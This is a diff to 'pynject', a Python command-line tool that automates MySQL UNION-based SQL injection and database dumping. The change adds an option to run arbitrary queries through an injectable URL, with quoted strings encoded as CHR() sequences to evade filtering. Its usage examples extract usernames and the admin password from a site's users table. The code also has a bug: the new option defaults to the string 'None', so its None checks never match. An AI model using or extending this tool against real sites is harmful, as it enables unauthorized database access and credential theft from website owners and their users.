@@ -18,9 +18,8 @@
 # or write to the Free Software Foundation, Inc.,
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 
-import sys, os, time, random, re, threading, urllib.request, urllib.error
+import sys, os, time, random, re, threading, urllib.request, urllib.error, urllib.parse
 from optparse import OptionParser, OptionGroup 
-from urllib.parse import urlencode 
 
 # This class is a modified version of ProgressBar from BJ Dierkes <wdierkes@5dollarwhitebox.org>
 # Thanks BJ :)
@@ -173,6 +172,25 @@ class Pynject:
         print( "\n\tpynject 1.0 - An automatic MySQL injector and data dumper tool.\n" +
                "\tCopyleft Simone Margaritelli <evilsocket@gmail.com>\n" +
                "\thttp://www.evilsocket.net\n\n" );
+
+    def execQuery( self, query ):
+        print( "@ Executing query '{0}' .".format(query) )
+        
+        # encode all '...' strings to CHR(...)
+        rex     = re.compile( "'([^']+)'" )
+        strings = rex.findall(query)
+        if len(strings):
+            for string in strings:
+                query = query.replace( "'{0}'".format(string), self.__stringToChrSeq(string) )
+        # now encode all "..." strings to CHR(...)
+        rex     = re.compile( '"([^"]+)"' )
+        strings = rex.findall(query)
+        if len(strings):
+            for string in strings:
+                query = query.replace( '"{0}"'.format(string), self.__stringToChrSeq(string) )
+
+        data = self.sqlInject( what = "({0})".format( urllib.parse.quote(query) ), table = None, where = None, index = None, xtype = "string" )
+        return data
 
     def fetchDatabases( self ):
         print( "@ Fetching number of dbs ." )
@@ -434,7 +452,8 @@ if __name__ == '__main__':
                                        "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' --dbs\n" +
                                        "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop --tables\n" +
                                        "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop -T users --columns\n" +
-                                       "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop -T users -F 'username,password' --records --start 0 --end 100\n" )
+                                       "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop -T users -F 'username,password' --records --start 0 --end 100\n\n" +
+                                       "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' --query 'SELECT password FROM shop.users WHERE username='admin' LIMIT 0,1'\n\n" )
 
         parser.add_option( "-u", "--url",      action="store",       dest="url",      default=None,    help="The full url with a visible union injection.")
         parser.add_option( "-m", "--marker",   action="store",       dest="marker",   default=None,    help="Marker used in the url to identify visible item.")
@@ -447,11 +466,12 @@ if __name__ == '__main__':
         parser.add_option( "-F", "--fields",   action="store",       dest="fields",   default=None,    help="Comma separated values of fields to use.")
 
         actions = OptionGroup( parser, "Actions" )
-        actions.add_option( "--dbs",     action="store_const", const="dbs",     dest="action", help="Enumerates the list of databases." )
-        actions.add_option( "--tables",  action="store_const", const="tables",  dest="action", help="Enumerates the list of tables, requires -D." )
-        actions.add_option( "--columns", action="store_const", const="columns", dest="action", help="Enumerates the list of columns, requires -D and -T." )
-        actions.add_option( "--records", action="store_const", const="records", dest="action", help="Fetch the records from a table, requires -D, -T and -F." )
-        actions.add_option( "--struct",  action="store_const", const="struct",  dest="action", help="Dumps the whole structure of the database." )
+        actions.add_option( "--dbs",     action="store_const", const="dbs",     dest="action",  help="Enumerates the list of databases." )
+        actions.add_option( "--tables",  action="store_const", const="tables",  dest="action",  help="Enumerates the list of tables, requires -D." )
+        actions.add_option( "--columns", action="store_const", const="columns", dest="action",  help="Enumerates the list of columns, requires -D and -T." )
+        actions.add_option( "--records", action="store_const", const="records", dest="action",  help="Fetch the records from a table, requires -D, -T and -F." )
+        actions.add_option( "--struct",  action="store_const", const="struct",  dest="action",  help="Dumps the whole structure of the database." )
+        actions.add_option( "--query",   action="store",       dest="query",    default="None", help="Execute arbitrary query, remember to fetch only ONE row a time, so use ALWAYS 'LIMIT 0,1' syntax! (quoted values will be automatically encoded with CHR function.)" ) 
 
         omethods = OptionGroup( parser, "Output Methods" )
         omethods.add_option( "-p", "--print", action="store", dest="omethod", default="print", help="Simply print data on the console (DEFAULT).")
@@ -467,7 +487,7 @@ if __name__ == '__main__':
             parser.error( "No marker specified." )
         elif o.url.find(o.marker) == -1:
             parser.error( "Invalid marker, not found in given url." )
-        elif o.action == None:
+        elif o.action == None and o.query == None:
             parser.error( "No action specified." )
         elif o.action == "tables" and o.database == None:
             parser.error( "No database specified." )
@@ -490,6 +510,8 @@ if __name__ == '__main__':
             pynject.fetchRecords( o.database, o.table, o.fields.split(","), int(o.start), int(o.end) )
         elif o.action == "struct":
             pynject.fetchWholeStructure()
+        elif o.query != None:
+            print( "\n\n"+ pynject.execQuery(o.query) )
 
         report = Report( pynject, o )
         report.show()        
